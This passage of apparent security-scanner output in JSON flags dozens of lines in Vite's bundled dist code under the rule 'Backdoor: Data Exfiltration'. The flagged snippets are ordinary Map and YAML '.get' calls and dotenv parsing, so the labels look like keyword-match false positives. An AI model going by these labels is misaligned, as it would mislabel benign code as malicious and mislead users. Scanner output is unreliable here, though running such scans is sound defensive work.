                      "markdown": "`            );\n          }\n        });\n        isAsyncScriptMap.get(config).set(id, everyScriptIsAsync);\n        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35020,
                  "startColumn": 26,
                  "endLine": 35020,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\nfunction addToHTMLProxyTransformResult(hash, code) {\n  htmlProxyResult.set(hash, code);\n",
                    "rendered": {
                      "text": "  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\nfunction addToHTMLProxyTransformResult(hash, code) {\n  htmlProxyResult.set(hash, code);\n",
                      "markdown": "`  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\nfunction addToHTMLProxyTransformResult(hash, code) {\n  htmlProxyResult.set(hash, code);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35020,
                  "startColumn": 14,
                  "endLine": 35020,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\nfunction addToHTMLProxyTransformResult(hash, code) {\n  htmlProxyResult.set(hash, code);\n",
                    "rendered": {
                      "text": "  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\nfunction addToHTMLProxyTransformResult(hash, code) {\n  htmlProxyResult.set(hash, code);\n",
                      "markdown": "`  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\nfunction addToHTMLProxyTransformResult(hash, code) {\n  htmlProxyResult.set(hash, code);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35018,
                  "startColumn": 16,
                  "endLine": 35018,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\n",
                    "rendered": {
                      "text": "    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\n",
                      "markdown": "`    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35017,
                  "startColumn": 31,
                  "endLine": 35017,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n",
                    "rendered": {
                      "text": "  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n",
                      "markdown": "`  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35017,
                  "startColumn": 19,
                  "endLine": 35017,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n",
                    "rendered": {
                      "text": "  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n",
                      "markdown": "`  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n    htmlProxyMap.get(config).set(filePath, []);\n  }\n  htmlProxyMap.get(config).get(filePath)[index] = result;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35014,
                  "startColumn": 19,
                  "endLine": 35014,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  };\n}\nfunction addToHTMLProxyCache(config, filePath, index, result) {\n  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n",
                    "rendered": {
                      "text": "  };\n}\nfunction addToHTMLProxyCache(config, filePath, index, result) {\n  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n",
                      "markdown": "`  };\n}\nfunction addToHTMLProxyCache(config, filePath, index, result) {\n  if (!htmlProxyMap.get(config)) {\n    htmlProxyMap.set(config, /* @__PURE__ */ new Map());\n  }\n  if (!htmlProxyMap.get(config).get(filePath)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35003,
                  "startColumn": 47,
                  "endLine": 35003,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        const index = Number(proxyMatch[1]);\n        const file = cleanUrl(id);\n        const url = file.replace(normalizePath$3(config.root), \"\");\n        const result = htmlProxyMap.get(config).get(url)?.[index];\n        if (result) {\n          return result;\n        } else {\n",
                    "rendered": {
                      "text": "        const index = Number(proxyMatch[1]);\n        const file = cleanUrl(id);\n        const url = file.replace(normalizePath$3(config.root), \"\");\n        const result = htmlProxyMap.get(config).get(url)?.[index];\n        if (result) {\n          return result;\n        } else {\n",
                      "markdown": "`        const index = Number(proxyMatch[1]);\n        const file = cleanUrl(id);\n        const url = file.replace(normalizePath$3(config.root), \"\");\n        const result = htmlProxyMap.get(config).get(url)?.[index];\n        if (result) {\n          return result;\n        } else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35003,
                  "startColumn": 35,
                  "endLine": 35003,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        const index = Number(proxyMatch[1]);\n        const file = cleanUrl(id);\n        const url = file.replace(normalizePath$3(config.root), \"\");\n        const result = htmlProxyMap.get(config).get(url)?.[index];\n        if (result) {\n          return result;\n        } else {\n",
                    "rendered": {
                      "text": "        const index = Number(proxyMatch[1]);\n        const file = cleanUrl(id);\n        const url = file.replace(normalizePath$3(config.root), \"\");\n        const result = htmlProxyMap.get(config).get(url)?.[index];\n        if (result) {\n          return result;\n        } else {\n",
                      "markdown": "`        const index = Number(proxyMatch[1]);\n        const file = cleanUrl(id);\n        const url = file.replace(normalizePath$3(config.root), \"\");\n        const result = htmlProxyMap.get(config).get(url)?.[index];\n        if (result) {\n          return result;\n        } else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34539,
                  "startColumn": 38,
                  "endLine": 34539,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                    "rendered": {
                      "text": "  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                      "markdown": "`  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29468,
                  "startColumn": 27,
                  "endLine": 29468,
                  "endColumn": 32,
                  "snippet": {
                    "text": "     */\n    get(key, keepScalar) {\n        return isCollection$1(this.contents)\n            ? this.contents.get(key, keepScalar)\n            : undefined;\n    }\n    /**\n",
                    "rendered": {
                      "text": "     */\n    get(key, keepScalar) {\n        return isCollection$1(this.contents)\n            ? this.contents.get(key, keepScalar)\n            : undefined;\n    }\n    /**\n",
                      "markdown": "`     */\n    get(key, keepScalar) {\n        return isCollection$1(this.contents)\n            ? this.contents.get(key, keepScalar)\n            : undefined;\n    }\n    /**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29155,
                  "startColumn": 22,
                  "endLine": 29155,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    'tag:yaml.org,2002:timestamp': timestamp\n};\nfunction getTags(customTags, schemaName) {\n    let tags = schemas.get(schemaName);\n    if (!tags) {\n        if (Array.isArray(customTags))\n            tags = [];\n",
                    "rendered": {
                      "text": "    'tag:yaml.org,2002:timestamp': timestamp\n};\nfunction getTags(customTags, schemaName) {\n    let tags = schemas.get(schemaName);\n    if (!tags) {\n        if (Array.isArray(customTags))\n            tags = [];\n",
                      "markdown": "`    'tag:yaml.org,2002:timestamp': timestamp\n};\nfunction getTags(customTags, schemaName) {\n    let tags = schemas.get(schemaName);\n    if (!tags) {\n        if (Array.isArray(customTags))\n            tags = [];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27067,
                  "startColumn": 29,
                  "endLine": 27067,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            this.set(key, value);\n        }\n        else {\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.setIn(rest, value);\n            else if (node === undefined && this.schema)\n",
                    "rendered": {
                      "text": "            this.set(key, value);\n        }\n        else {\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.setIn(rest, value);\n            else if (node === undefined && this.schema)\n",
                      "markdown": "`            this.set(key, value);\n        }\n        else {\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.setIn(rest, value);\n            else if (node === undefined && this.schema)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27054,
                  "startColumn": 25,
                  "endLine": 27054,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.has(key);\n        const node = this.get(key, true);\n        return isCollection$1(node) ? node.hasIn(rest) : false;\n    }\n    /**\n",
                    "rendered": {
                      "text": "        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.has(key);\n        const node = this.get(key, true);\n        return isCollection$1(node) ? node.hasIn(rest) : false;\n    }\n    /**\n",
                      "markdown": "`        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.has(key);\n        const node = this.get(key, true);\n        return isCollection$1(node) ? node.hasIn(rest) : false;\n    }\n    /**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27027,
                  "startColumn": 25,
                  "endLine": 27027,
                  "endColumn": 30,
                  "snippet": {
                    "text": "     */\n    getIn(path, keepScalar) {\n        const [key, ...rest] = path;\n        const node = this.get(key, true);\n        if (rest.length === 0)\n            return !keepScalar && isScalar$1(node) ? node.value : node;\n        else\n",
                    "rendered": {
                      "text": "     */\n    getIn(path, keepScalar) {\n        const [key, ...rest] = path;\n        const node = this.get(key, true);\n        if (rest.length === 0)\n            return !keepScalar && isScalar$1(node) ? node.value : node;\n        else\n",
                      "markdown": "`     */\n    getIn(path, keepScalar) {\n        const [key, ...rest] = path;\n        const node = this.get(key, true);\n        if (rest.length === 0)\n            return !keepScalar && isScalar$1(node) ? node.value : node;\n        else\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27014,
                  "startColumn": 25,
                  "endLine": 27014,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.delete(key);\n        const node = this.get(key, true);\n        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n",
                    "rendered": {
                      "text": "        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.delete(key);\n        const node = this.get(key, true);\n        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n",
                      "markdown": "`        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.delete(key);\n        const node = this.get(key, true);\n        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26997,
                  "startColumn": 29,
                  "endLine": 26997,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            this.add(value);\n        else {\n            const [key, ...rest] = path;\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.addIn(rest, value);\n            else if (node === undefined && this.schema)\n",
                    "rendered": {
                      "text": "            this.add(value);\n        else {\n            const [key, ...rest] = path;\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.addIn(rest, value);\n            else if (node === undefined && this.schema)\n",
                      "markdown": "`            this.add(value);\n        else {\n            const [key, ...rest] = path;\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.addIn(rest, value);\n            else if (node === undefined && this.schema)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26886,
                  "startColumn": 27,
                  "endLine": 26886,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    // after first. The `ref` wrapper allows for circular references to resolve.\n    let ref = undefined;\n    if (aliasDuplicateObjects && value && typeof value === 'object') {\n        ref = sourceObjects.get(value);\n        if (ref) {\n            if (!ref.anchor)\n                ref.anchor = onAnchor(value);\n",
                    "rendered": {
                      "text": "    // after first. The `ref` wrapper allows for circular references to resolve.\n    let ref = undefined;\n    if (aliasDuplicateObjects && value && typeof value === 'object') {\n        ref = sourceObjects.get(value);\n        if (ref) {\n            if (!ref.anchor)\n                ref.anchor = onAnchor(value);\n",
                      "markdown": "`    // after first. The `ref` wrapper allows for circular references to resolve.\n    let ref = undefined;\n    if (aliasDuplicateObjects && value && typeof value === 'object') {\n        ref = sourceObjects.get(value);\n        if (ref) {\n            if (!ref.anchor)\n                ref.anchor = onAnchor(value);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26813,
                  "startColumn": 51,
                  "endLine": 26813,
                  "endColumn": 56,
                  "snippet": {
                    "text": "function getAliasCount(doc, node, anchors) {\n    if (isAlias(node)) {\n        const source = node.resolve(doc);\n        const anchor = anchors && source && anchors.get(source);\n        return anchor ? anchor.count * anchor.aliasCount : 0;\n    }\n    else if (isCollection$1(node)) {\n",
                    "rendered": {
                      "text": "function getAliasCount(doc, node, anchors) {\n    if (isAlias(node)) {\n        const source = node.resolve(doc);\n        const anchor = anchors && source && anchors.get(source);\n        return anchor ? anchor.count * anchor.aliasCount : 0;\n    }\n    else if (isCollection$1(node)) {\n",
                      "markdown": "`function getAliasCount(doc, node, anchors) {\n    if (isAlias(node)) {\n        const source = node.resolve(doc);\n        const anchor = anchors && source && anchors.get(source);\n        return anchor ? anchor.count * anchor.aliasCount : 0;\n    }\n    else if (isCollection$1(node)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26778,
                  "startColumn": 26,
                  "endLine": 26778,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        if (!data) {\n            // Resolve anchors for Node.prototype.toJS()\n            toJS(source, null, ctx);\n            data = anchors.get(source);\n        }\n        /* istanbul ignore if */\n        if (!data || data.res === undefined) {\n",
                    "rendered": {
                      "text": "        if (!data) {\n            // Resolve anchors for Node.prototype.toJS()\n            toJS(source, null, ctx);\n            data = anchors.get(source);\n        }\n        /* istanbul ignore if */\n        if (!data || data.res === undefined) {\n",
                      "markdown": "`        if (!data) {\n            // Resolve anchors for Node.prototype.toJS()\n            toJS(source, null, ctx);\n            data = anchors.get(source);\n        }\n        /* istanbul ignore if */\n        if (!data || data.res === undefined) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26774,
                  "startColumn": 26,
                  "endLine": 26774,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            const msg = `Unresolved alias (the anchor must be set before the alias): ${this.source}`;\n            throw new ReferenceError(msg);\n        }\n        let data = anchors.get(source);\n        if (!data) {\n            // Resolve anchors for Node.prototype.toJS()\n            toJS(source, null, ctx);\n",
                    "rendered": {
                      "text": "            const msg = `Unresolved alias (the anchor must be set before the alias): ${this.source}`;\n            throw new ReferenceError(msg);\n        }\n        let data = anchors.get(source);\n        if (!data) {\n            // Resolve anchors for Node.prototype.toJS()\n            toJS(source, null, ctx);\n",
                      "markdown": "`            const msg = `Unresolved alias (the anchor must be set before the alias): ${this.source}`;\n            throw new ReferenceError(msg);\n        }\n        let data = anchors.get(source);\n        if (!data) {\n            // Resolve anchors for Node.prototype.toJS()\n            toJS(source, null, ctx);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26640,
                  "startColumn": 30,
                  "endLine": 26640,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        }\n        else if (val instanceof Map) {\n            for (const k of Array.from(val.keys())) {\n                const v0 = val.get(k);\n                const v1 = applyReviver(reviver, val, k, v0);\n                if (v1 === undefined)\n                    val.delete(k);\n",
                    "rendered": {
                      "text": "        }\n        else if (val instanceof Map) {\n            for (const k of Array.from(val.keys())) {\n                const v0 = val.get(k);\n                const v1 = applyReviver(reviver, val, k, v0);\n                if (v1 === undefined)\n                    val.delete(k);\n",
                      "markdown": "`        }\n        else if (val instanceof Map) {\n            for (const k of Array.from(val.keys())) {\n                const v0 = val.get(k);\n                const v1 = applyReviver(reviver, val, k, v0);\n                if (v1 === undefined)\n                    val.delete(k);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26602,
                  "startColumn": 41,
                  "endLine": 26602,
                  "endColumn": 46,
                  "snippet": {
                    "text": "         */\n        setAnchors: () => {\n            for (const source of aliasObjects) {\n                const ref = sourceObjects.get(source);\n                if (typeof ref === 'object' &&\n                    ref.anchor &&\n                    (isScalar$1(ref.node) || isCollection$1(ref.node))) {\n",
                    "rendered": {
                      "text": "         */\n        setAnchors: () => {\n            for (const source of aliasObjects) {\n                const ref = sourceObjects.get(source);\n                if (typeof ref === 'object' &&\n                    ref.anchor &&\n                    (isScalar$1(ref.node) || isCollection$1(ref.node))) {\n",
                      "markdown": "`         */\n        setAnchors: () => {\n            for (const source of aliasObjects) {\n                const ref = sourceObjects.get(source);\n                if (typeof ref === 'object' &&\n                    ref.anchor &&\n                    (isScalar$1(ref.node) || isCollection$1(ref.node))) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26057,
                  "startColumn": 20,
                  "endLine": 26057,
                  "endColumn": 25,
                  "snippet": {
